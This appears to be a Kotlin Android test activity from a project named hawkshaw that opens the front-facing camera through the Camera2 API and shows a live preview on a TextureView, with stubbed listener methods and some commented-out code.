package me.hawkshaw.test

import android.content.Context
import android.content.pm.PackageManager
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.support.v4.app.ActivityCompat
import android.util.Log
import android.util.Size
import android.view.Surface
import android.view.TextureView
import kotlinx.android.synthetic.main.activity_camera2.*
import me.hawkshaw.R
import me.hawkshaw.tasks.StreamCamera
import me.hawkshaw.utils.Constants
import java.util.*

class Camera2 : AppCompatActivity(), TextureView.SurfaceTextureListener {

    private var cameraId: String = "null"
    private var previewSize: Size? = null
    private val handler by lazy { Handler() }
    private val cameraManager by lazy { getSystemService(Context.CAMERA_SERVICE) as CameraManager }
    private val cameraFacing = CameraCharacteristics.LENS_FACING_FRONT


    /*private val backgroundThread: HandlerThread by lazy { HandlerThread("camera_background_thread") }
    //private val backgroundHandler: Handler

    init {
        backgroundThread.start()
        //backgroundHandler = Handler(backgroundThread.looper)
    }*/


    override fun onSurfaceTextureSizeChanged(surface: SurfaceTexture?, width: Int, height: Int) {
        //To change body of created functions use File | Settings | File Templates.
    }

    override fun onSurfaceTextureUpdated(surface: SurfaceTexture?) {
        //To change body of created functions use File | Settings | File Templates.
    }

    override fun onSurfaceTextureDestroyed(surface: SurfaceTexture?): Boolean {
        //To change body of created functions use File | Settings | File Templates.
        return false
    }

    override fun onSurfaceTextureAvailable(surface: SurfaceTexture?, width: Int, height: Int) {
        //To change body of created functions use File | Settings | File Templates.
        setUpCamera()
        openCamera()
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_camera2)

        StreamCamera(this, Handler()).start()
    }

    override fun onResume() {
        super.onResume()

        /*if (texture_view.isAvailable) {
            setUpCamera()
            openCamera()
        } else
            texture_view.surfaceTextureListener = this*/
    }

    private fun setUpCamera() {
        for (cameraId in cameraManager.cameraIdList) {

            Log.d(Constants.tag, "Camera List $cameraId")
            val cameraCharacteristics = cameraManager.getCameraCharacteristics(cameraId)
            if (cameraCharacteristics.get(CameraCharacteristics.LENS_FACING) == cameraFacing) {
                val streamConfigurationMap = cameraCharacteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                val previewSize: Size = streamConfigurationMap.getOutputSizes(SurfaceTexture::class.java)[0]
                this.cameraId = cameraId
                this.previewSize = previewSize

                Log.d(Constants.tag, "Setup Camera")
            }
        }
    }

    private fun openCamera() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

            Log.d(Constants.tag, "OpenCamera $cameraId")

            cameraManager.openCamera(cameraId, stateCallback, handler)
        }
    }

    private val stateCallback: CameraDevice.StateCallback

    init {
        stateCallback = object : CameraDevice.StateCallback() {

            override fun onOpened(camera: CameraDevice?) {
                //To change body of created functions use File | Settings | File Templates.
                createPreviewSession(camera ?: return)

                Log.d(Constants.tag, "CameraDevice.StateCallback : onOpened $camera")
            }

            override fun onDisconnected(camera: CameraDevice?) {
                //To change body of created functions use File | Settings | File Templates.
                camera?.close()

                Log.d(Constants.tag, "CameraDevice.StateCallback : onDisconnected")
            }

            override fun onError(camera: CameraDevice?, error: Int) {
                //To change body of created functions use File | Settings | File Templates.
                camera?.close()

                Log.d(Constants.tag, "CameraDevice.StateCallback : onError")
            }
        }
    }

    private fun createPreviewSession(camera: CameraDevice) {

        val surfaceTexture = texture_view.surfaceTexture
        val previewSize = this.previewSize ?: return
        surfaceTexture.setDefaultBufferSize(previewSize.width, previewSize.height)


        val previewSurface = Surface(surfaceTexture)
        val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
        captureRequestBuilder.addTarget(previewSurface)

        //captureRequestBuilder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_TORCH)

        camera.createCaptureSession(Collections.singletonList(previewSurface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigureFailed(session: CameraCaptureSession?) {
                //To change body of created functions use File | Settings | File Templates.
            }

            override fun onConfigured(session: CameraCaptureSession?) {
                //To change body of created functions use File | Settings | File Templates.

                captureRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                captureRequestBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)

                val captureRequest = captureRequestBuilder.build()
                session?.setRepeatingRequest(captureRequest, null, handler)
            }

        }, handler)
    }
}
